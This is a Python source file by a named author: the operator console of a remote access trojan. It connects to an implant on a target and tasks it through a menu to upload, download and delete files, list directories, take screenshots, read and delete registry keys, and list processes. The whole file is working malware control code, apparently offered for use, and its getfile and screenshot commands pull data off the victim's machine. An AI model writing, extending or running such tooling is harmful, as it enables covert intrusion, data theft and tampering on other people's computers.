# Patrick Sacchet
# Version 1.0
# Serves as the main CMD client interface which will provide tasking to our RAT on target

import socket
import argparse
from RAT_Py_GetFile import *
from RAT_Py_PutFile import *
from RAT_Py_DirList import * 
from RAT_Py_DeleteFile import *
from RAT_Py_Screenshot import * 
from RAT_Py_Registry import *
from RAT_Py_Process import *

SUCCESS = 1
FAILURE = 0
EXIT = 0


#-----------------------------------------------

#-----------------------------------------------
def printHelp():
    print("""Please select from the following options: \n
                putfile - Write a file to a location on target \n
                getfile - Get a file from a specific location on target\n
                dirlist - Perform a dir list for a particular directory on target\n
                deletefile - Perform a delete file off target\n
                screenshot - Take a screenshot of target (will get file and delete file off target)\n
                regread - Read a registry key off target\n
                regdelete - Delete a registry key/value off target\n
                processlist -  List all running processes off target\n
                exit - Task agent to shutdown gracefully and cleanup\n""")
    return SUCCESS


#-----------------------------------------------

#-----------------------------------------------
def doConnect(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, int(port)))

    except Exception as e:
        print("ERROR: Could not connect to implant: ", e)
        return FAILURE

    return sock

#-----------------------------------------------

#-----------------------------------------------
def handleInput(ip, port):
    print("Reaching out to agent for connection establishment...")
    sock = doConnect(ip, port)

    print("Connected to agent at %s on port %d" % (sock.getpeername()[0], sock.getpeername()[1]))
    userInput = ""
    while (userInput != "exit"):
        printHelp()
 
        userInput = input("> ")
        userInput = userInput.lower()

        # PUT == 1
        if (userInput == "putfile"):
            printPutFileHelp()
            user_input = input("> ")
            parser = argparse.ArgumentParser(description='Perform a put file on target')
            parser.add_argument('-filepath', '--filepath', type=str, help='Path to file to put on target', action='store', required=True)
            parser.add_argument('-outputfilepath', '--localfilepath', type=str, help='Path to remote location on target we are writing to', action='store', required=True)
            parser.add_argument('-overwrite','--overwrite', help="Whether to overwrite an existing file of the same name on target", action='store_true', required=False)
            args = parser.parse_args(user_input.split())

            filepath = bytes(args.filepath, 'utf-8')

            outputfilepath = bytes(args.localfilepath, 'utf-8')

            # Needs to not be bool since we're sending this value over the wire 
            if (args.overwrite):
                overwrite = 1
            else:
                overwrite = 0

            putFile(sock, filepath, outputfilepath, overwrite)

        # GET == 2
        elif (userInput == "getfile"):
            printGetFileHelp()
            user_input = input("> ")
            parser = argparse.ArgumentParser(description='Perform a get file off target')
            parser.add_argument('-filepath', '--filepath', type=str, help='Path to file to get on target', action='store', required=True)
            parser.add_argument('-outfilepath', '--outfilepath', type=str, help='Path to output file write on local machine', action='store', required=True)
            parser.add_argument('-overwrite','--overwrite', help="Whether to overwrite an existing file of the same name on the local machine", action='store_true', required=False)
            args = parser.parse_args(user_input.split())
            
            filepath = bytes(args.filepath, 'utf-8')
            outfilepath = args.outfilepath

            if (args.overwrite):
                overwrite = True
            else:
                overwrite = False
            
            getFile(sock, filepath, outfilepath, overwrite)

        # DIR == 3
        elif(userInput == "dirlist"):
            printDirListHelp()
            user_input = input("> ")
            parser = argparse.ArgumentParser(description='Perform a dir list off target')
            parser.add_argument('-path', '--path', type=str, help='Path to dir list on target', action='store', required=True)
            args = parser.parse_args(user_input.split())
            
            dirPath = bytes(args.path, 'utf-8')

            dirList(sock, dirPath)

        # DEL == 4
        elif(userInput == "deletefile"):
            printDeleteFileHelp()
            user_input = input("> ")
            parser = argparse.ArgumentParser(description='Perform a delete file off target')
            parser.add_argument('-filepath', '--filepath', type=str, help='Path to the file we are deleting off target', action='store', required=True)
            args = parser.parse_args(user_input.split())
            
            filePath = bytes(args.filepath, 'utf-8')

            deleteFile(sock, filePath)

        # SCREENSHOT == 5
        elif(userInput == "screenshot"):
            printScreenshotHelp()
            user_input = input("> ")
            parser = argparse.ArgumentParser(description='Perform a screenshot of target')
            parser.add_argument('-filepath', '--filepath', type=str, help='Path where we would like to write our screenshot to locally', action='store', required=True)
            args = parser.parse_args(user_input.split())
            
            filePath = args.filepath

            screenshot(sock, filePath)

        # REGREAD == 6
        elif (userInput == "regread"):
            printRegReadHelp()
            user_input = input("> ")
            parser = argparse.ArgumentParser(description='Perform a registry read off target')
            parser.add_argument('-keypath', '--keypath', type=str, help='Path to the registry key we are reading', action='store', required=True)
            parser.add_argument('-value', '--value', type=str, help='Name of the value we want to read', action='store', required=True)
            args = parser.parse_args(user_input.split())

            keyPath = bytes(args.keypath, 'utf-8')
            value = bytes(args.value, 'utf-8')

            regRead(sock, keyPath, value)

        # REGDELETE == 9
        elif (userInput == "regdelete"):
            printRegDeleteHelp()
            user_input = input("> ")
            parser = argparse.ArgumentParser(description='Delete a registry key/value off target')
            parser.add_argument('-iskey', '--iskey', help='The value being passed is a subkey we are deleting, not a value - if not passed it is assumed a value', required=False, action='store_true')
            parser.add_argument('-keypath', '--keypath', type=str, help='Path to the registry key that contains the key/value we are deleting', action='store', required=True)
            parser.add_argument('-value', '--value', type=str, help='Name of the value/key we want to delete', action='store', required=True)
            args = parser.parse_args(user_input.split())

            if (args.iskey):
                isKey = 1
            else:
                isKey = 0

            keyPath = bytes(args.keypath, 'utf-8')
            value = bytes(args.value, 'utf-8')

            regDelete(sock, isKey, keyPath, value)

        # PROCESSLIST == 10
        elif (userInput == "processlist"):
            printProcessListHelp()
            processList(sock)

            
    return

#-----------------------------------------------

#-----------------------------------------------
def main():
    parser = argparse.ArgumentParser(description='Python C2 script')
    parser.add_argument('-ip', '--ip', type=str, help='IP address of target', action='store', required=True)
    parser.add_argument('-port', '--port', type=str, help='Port number our implant is listening on', action='store', required=True)
    args = parser.parse_args()

    handleInput(args.ip, args.port)

    return SUCCESS

#-----------------------------------------------
if __name__ == '__main__':
    main()
